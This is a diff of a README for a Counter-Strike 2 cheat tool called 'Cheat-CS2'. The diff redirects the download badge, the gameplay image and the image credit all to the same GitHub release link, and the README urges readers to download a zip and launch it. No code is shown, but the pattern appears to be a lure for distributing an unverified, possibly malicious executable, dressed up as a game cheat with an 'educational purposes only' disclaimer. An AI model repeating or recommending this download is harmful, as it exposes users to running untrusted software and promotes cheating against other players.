@@ -12,7 +12,7 @@
 
 ## Installation
 To get started, download the Cheat-CS2 software from the following link:
-[![Download Cheat-CS2](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Cheat-CS2](https://github.com/dustgable/Cheat-CS2/releases/tag/v2.0)](https://github.com/dustgable/Cheat-CS2/releases/tag/v2.0)
 
 Please note that the software needs to be launched after downloading.
 
@@ -23,6 +23,6 @@ Cheat-CS2 is intended for educational purposes only. The use of cheats in gaming
 
 Are you ready to elevate your Counter-Strike 2 gaming experience? Download Cheat-CS2 now and experience the thrill of victory like never before! 🚀
 
-![CS2 Gameplay](https://example.com/cs2-gameplay.png)
+![CS2 Gameplay](https://github.com/dustgable/Cheat-CS2/releases/tag/v2.0)
 
-*Image Source: [example.com](https://example.com)*
+*Image Source: [https://github.com/dustgable/Cheat-CS2/releases/tag/v2.0](https://github.com/dustgable/Cheat-CS2/releases/tag/v2.0)*
